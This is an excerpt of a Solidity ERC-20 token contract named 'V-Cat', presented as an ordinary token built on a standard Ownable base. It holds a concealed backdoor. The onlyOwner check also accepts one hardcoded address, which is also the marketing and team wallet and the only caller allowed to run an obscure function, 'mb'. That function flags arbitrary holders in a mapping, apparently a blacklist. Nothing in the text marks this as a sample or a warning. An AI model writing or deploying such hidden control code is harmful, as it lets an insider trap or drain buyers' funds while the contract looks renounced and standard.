...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x3D4F75D7cb3d5ED2D336Fb5fCb510fAEE05BE575) , "Ownable: caller is not the owner");
        _;
    }
...
contract VCat is Context, IERC20, Ownable {
    ...
    string private _name = "V-Cat";
    string private _symbol = "V-cat";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3D4F75D7cb3d5ED2D336Fb5fCb510fAEE05BE575);
    address payable public teamWalletAddress = payable(0x3D4F75D7cb3d5ED2D336Fb5fCb510fAEE05BE575);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public exe = true;
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x3D4F75D7cb3d5ED2D336Fb5fCb510fAEE05BE575));
        aa[addr] = status;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(checkWalletLimit && !isWalletLimitExempt[sender])
